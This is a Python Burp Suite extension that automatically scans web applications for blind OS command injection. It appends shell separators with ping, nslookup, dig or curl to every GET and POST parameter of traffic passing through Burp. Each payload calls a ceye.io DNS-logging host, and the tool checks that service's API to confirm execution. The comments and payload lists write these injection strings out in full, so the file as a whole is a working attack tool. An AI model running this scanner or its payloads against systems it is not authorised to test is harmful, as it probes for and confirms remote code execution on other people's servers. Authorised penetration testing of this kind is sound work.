# -*-coding:utf-8 -*-
# !/usr/bin/env python
# author:ske
# 对get参数和post参数检测，忽略了Cookies参数的检测。
# 通过ping服务器的IP判断操作系统，再调用对应的操作系统。
# --------------------------------------------------------------------------------------------------------
# Windows
# ip = 127.0.0.1 | nslookup {}.5xxla4.ceye.io
# ip = 127.0.0.1 ; nslookup {}.5xxla4.ceye.io
# ip = 127.0.0.1 '; nslookup {}.5xxla4.ceye.io
# ip = 127.0.0.1 "; nslookup {}.5xxla4.ceye.io
# ip = 127.0.0.1 | ping {}.5xxla4.ceye.io
# ip = 127.0.0.1 & ping {}.5xxla4.ceye.io
# ip = 127.0.0.1 ; ping {}.5xxla4.ceye.io
# ip = 127.0.0.1 && ping {}.5xxla4.ceye.io
# ip = 127.0.0.1 %0a ping {}.5xxla4.ceye.io %0a		# 必须要有空格
# ip = 127.0.0.1 ";ping {}.5xxla4.ceye.io
# --------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------
# Linux
# ip = 127.0.0.1 | dig vighaw.exeye.io
# ip = 127.0.0.1 ; dig vighaw.exeye.io
# ip = 127.0.0.1 '; dig vighaw.exeye.io
# ip = 127.0.0.1 "; dig vighaw.exeye.io
# ip = 127.0.0.1 | curl {}.vighaw.exeye.io
# ip = 127.0.0.1 & curl {}.vighaw.exeye.io
# ip = 127.0.0.1 ; curl {}.vighaw.exeye.io
# ip = 127.0.0.1 && curl {}.vighaw.exeye.io
# ip = 127.0.0.1 %0a curl {}.vighaw.exeye.io %0a
# ip = 127.0.0.1 ";curl {}.vighaw.exeye.io
# --------------------------------------------------------------------------------------------------------
from __future__ import with_statement
from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
from urlparse import urlparse
import threading
import uuid
import platform
import urllib2
import urllib
import os
import subprocess
import re

print "check RCE\n author:ske"

# 漏洞存储路径
saveFile = r'H:\2. py\py_self\py3\project\burpExtend\RCE.txt'


# ceye的api查询接口
url = r'http://api.ceye.io/v1/records?token={token}&type={dns}'
# 凭证
token = r'XXXXXXXXX'
# 查询类型指定dns，因为命令执行是dns
type = r'dns'
# Identifier
Identifier = r'XXXXXX.ceye.io'

# 调试开关
isDebug = 1
# 插件名字
ExtensionName = r'RCE'


print platform.python_version()

# ip = {}.5xxla4.ceye.io
# ip = ping {}.5xxla4.ceye.io
# ip = curl {}.5xxla4.ceye.io
directPayloads = ['', 'ping', 'curl']


# ip = 127.0.0.1 | nslookup {}.5xxla4.ceye.io
# ip = 127.0.0.1 ; nslookup {}.5xxla4.ceye.io
# ip = 127.0.0.1 '; nslookup {}.5xxla4.ceye.io
# ip = 127.0.0.1 "; nslookup {}.5xxla4.ceye.io
# ip = 127.0.0.1 | ping {}.5xxla4.ceye.io
# ip = 127.0.0.1 & ping {}.5xxla4.ceye.io
# ip = 127.0.0.1 ; ping {}.5xxla4.ceye.io
# ip = 127.0.0.1 && ping {}.5xxla4.ceye.io
# ip = 127.0.0.1 %0a ping {}.5xxla4.ceye.io %0a		# 必须要有空格
# ip = 127.0.0.1 ";ping {}.5xxla4.ceye.io
winPayloads = ['| nslookup', '; nslookup', "'; nslookup", '"; nslookup', '| ping', '& ping', '; ping', '&& ping', '%0a ping', '";ping']


# ip = 127.0.0.1 | dig vighaw.exeye.io
# ip = 127.0.0.1 ; dig vighaw.exeye.io
# ip = 127.0.0.1 '; dig vighaw.exeye.io
# ip = 127.0.0.1 "; dig vighaw.exeye.io
# ip = 127.0.0.1 | curl {}.vighaw.exeye.io
# ip = 127.0.0.1 & curl {}.vighaw.exeye.io
# ip = 127.0.0.1 ; curl {}.vighaw.exeye.io
# ip = 127.0.0.1 && curl {}.vighaw.exeye.io
# ip = 127.0.0.1 %0a curl {}.vighaw.exeye.io %0a
# ip = 127.0.0.1 ";curl {}.vighaw.exeye.io

linuxPayloads = ['| dig', "; dig","'; dig", '"; dig', '| curl', '& curl', '; curl', '&& curl', '%0a curl', '";curl']



class BurpExtender(IBurpExtender, IHttpListener):

    def registerExtenderCallbacks(self, callbacks):

        self._callbacks = callbacks

        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。
        self._helpers = callbacks.getHelpers()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。
        self._callbacks.setExtensionName(ExtensionName)

        # 用于注册侦听器，该侦听器将通知任何Burp工具发出的请求和响应。扩展可以通过注册HTTP侦听器来执行自定义分析或修改这些消息。参数：listener- 实现IHttpListener接口的扩展创建的对象 。
        callbacks.registerHttpListener(self)

    # 获取请求的url
    def get_request_url(self, protocol, reqHeaders):
        link = reqHeaders[0].split(' ')[1]
        host = reqHeaders[1].split(' ')[1]
        return protocol + '://' + host + link

    # 保存结果
    def save(self, content):
        f = open(saveFile, 'at')
        f.writelines(content+'\n\n')
        f.close()

    # 获取操作系统
    def get_system(self, host):
        p = subprocess.Popen(r'ping {} -n 1'.format(host), stdout=subprocess.PIPE)
        ping_ret = p.stdout.read()
        ping_num = re.search(r'TTL=([\d]+)', ping_ret)
        system = 'Windows' if 100 < int(ping_num.group(1)) < 200 else 'Linux'
        return system

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedRequest = self._helpers.analyzeRequest(
            request)  # analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象
        reqHeaders = analyzedRequest.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。
        reqBodys = request[analyzedRequest.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。
        reqMethod = analyzedRequest.getMethod()  # 获取请求方法
        reqParameters = analyzedRequest.getParameters()
        return analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedResponse = self._helpers.analyzeResponse(
            response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
        resHeaders = analyzedResponse.getHeaders()  # getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。
        resBodys = response[
                   analyzedResponse.getBodyOffset():].tostring()  # getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。response[analyzedResponse.getBodyOffset():]获取正文内容
        resStatusCode = analyzedResponse.getStatusCode()  # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        return resHeaders, resBodys, resStatusCode

    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        ishttps = False
        if protocol == 'https':
            ishttps = True
        return host, port, protocol, ishttps

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

    # 发送命令执行payloads
    def RCE_request(self, request, protocol, host, port, ishttps, parameterName, parameterValueRCE,
                           parameterType, random_chars, check_rets):
        try:
            thread_id = threading.current_thread().ident
            if isDebug:
                print '[{}] -> {}={}\n'.format(thread_id, parameterName, parameterValueRCE)

            # 构造参数
            newParameter = self._helpers.buildParameter(parameterName, parameterValueRCE, parameterType)
            # 更新参数，并发送请求
            newRequest = self._helpers.updateParameter(request, newParameter)
            newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)

            # 新的响应
            newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
            newResHeaders, newResBodys, newResStatusCode = self.get_response_info(newResponse)

            newReqUrl = self.get_request_url(protocol, newReqHeaders)
            check_rets[random_chars] = (parameterName, parameterValueRCE, newReqUrl, newReqHeaders,
                                                                               newReqBodys)
        except Exception, e:
            pass

    # 从exeye查看dns日志，判断是否是RCE
    def check_RCE(self, check_rets):
        ceye_api_url = url.format(token=token, dns=type)
        response = urllib2.urlopen(ceye_api_url)
        text = response.read()

        for random_chars in check_rets:
            parameterName, parameterValueRCE, newReqUrl, newReqHeaders, newReqBodys = check_rets[random_chars]
            try:
                if random_chars in text:
                    content = '[RCE] {}={}\n[URL]{}\n[Headers] -> {}\n[Bodys] -> {}'.format(parameterName, parameterValueRCE, newReqUrl, newReqHeaders, newReqBodys)
                    print content
                    self.save(content)
                else:
                    print '[-] {}={}\n'.format(parameterName, parameterValueRCE)
                    content = '[-] {}={}\n[URL]{}\n[Headers] -> {}\n[Bodys] -> {}'.format(parameterName, parameterValueRCE, newReqUrl, newReqHeaders, newReqBodys)
                    self.save(content)
            except Exception, e:
                error = '[-] -> [{}] ERROR:{}'.format(random_chars, e)
                content = '[ERROR] {}\n{}={}\n[URL]{}\n[Headers] -> {}\n[Bodys] -> {}'.format(error, parameterName, parameterValueRCE, newReqUrl, newReqHeaders, newReqBodys)
                print content
                self.save(content)



    # 每次burp发送请求时，都会调用该方法
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        '''
        :param toolFlag:            一个标志，指示发出请求的Burp工具。Burp工具标志在IBurpExtenderCallbacks界面中定义
        :param messageIsRequest:    标记是否为请求或响应调用方法。
        :param messageInfo:         要处理的请求/响应的详细信息。扩展可以调用此对象上的setter方法来更新当前消息，从而修改Burp的行为。
        :return:
        '''

        # Proxy和Repeater触发插件
        if toolFlag == 64 or toolFlag == 16 or toolFlag == 8 or toolFlag == 4:

            # 处理响应内容
            if not messageIsRequest:

                # 获取请求包的数据
                request = messageInfo.getRequest()
                analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters = self.get_request_info(request)

                # 获取响应包的数据
                # response = messageInfo.getResponse()  # getResponse方法用于检索请求消息。返回：响应消息。
                # resHeaders, resBodys, resStatusCode = self.get_response_info(response)

                # 获取服务信息
                httpService = messageInfo.getHttpService()
                host, port, protocol, ishttps = self.get_server_info(httpService)

                # 获取请求的url
                # reqUrl = self.get_request_url(protocol, reqHeaders)

                system = self.get_system(host)

                print '[{}] {}'.format(system, host)

                check_rets = {}

                # 多线程遍历直接替换的命令注入payloads
                direct_threads = []  # 线程列表
                parameterDirect = []  # 直接替换命令注入payloads列表
                for parameter in reqParameters:
                    if parameter.getType() == 0 or parameter.getType() == 1:
                        parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
                        for directPayload in directPayloads:
                            random_chars = str(uuid.uuid4()).split('-')[0]
                            parameterDirect.append(
                                [parameterName, directPayload + ' {}.{}'.format(random_chars, Identifier),
                                 parameterType, random_chars])

                for directPayload in parameterDirect:
                    parameterName, parameterValueSQL, parameterType, random_chars = directPayload
                    t = threading.Thread(target=self.RCE_request, args=(request, protocol, host, port, ishttps, parameterName, parameterValueSQL, parameterType,
                                                                    random_chars, check_rets))
                    direct_threads.append(t)
                    t.start()
                for t in direct_threads:
                    t.join()



                # 多线程遍历每个windows命令注入payloads
                if system == 'Windows':
                    win_threads = []        # 线程列表
                    parameterWin = []       # windows命令注入payloads列表
                    for parameter in reqParameters:
                        # 筛选出get参数和post参数.      0是get参数，1是post参数，2是cookies参数
                        if parameter.getType() == 0 or parameter.getType() == 1:
                            parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
                            for winPayload in winPayloads:
                                random_chars = str(uuid.uuid4()).split('-')[0]
                                parameterWin.append(
                                    [parameterName, parameterValue + winPayload + ' {}.{}'.format(random_chars, Identifier),
                                     parameterType, random_chars])

                    for winPayload in parameterWin:
                        parameterName, parameterValueSQL, parameterType, random_chars = winPayload
                        t = threading.Thread(target=self.RCE_request, args=(request, protocol, host, port, ishttps, parameterName, parameterValueSQL, parameterType, random_chars, check_rets))
                        win_threads.append(t)
                        t.start()
                    for t in win_threads:
                        t.join()



                if system == 'Linux':
                    # 多线程遍历每个Linux命令注入payloads
                    linux_threads = []        # 线程列表
                    parameterLinux = []       # Linux命令注入payloads列表
                    for parameter in reqParameters:
                        if parameter.getType() == 0 or parameter.getType() == 1:
                            parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
                            for linuxPayload in linuxPayloads:
                                random_chars = str(uuid.uuid4()).split('-')[0]
                                parameterLinux.append(
                                    [parameterName, parameterValue + linuxPayload + ' {}.{}'.format(random_chars, Identifier),
                                     parameterType, random_chars])

                    for linuxPayload in parameterLinux:
                        parameterName, parameterValueSQL, parameterType, random_chars = linuxPayload
                        t = threading.Thread(target=self.RCE_request, args=(request, protocol, host, port, ishttps, parameterName, parameterValueSQL, parameterType, random_chars, check_rets))
                        linux_threads.append(t)
                        t.start()
                    for t in linux_threads:
                        t.join()

                self.check_RCE(check_rets)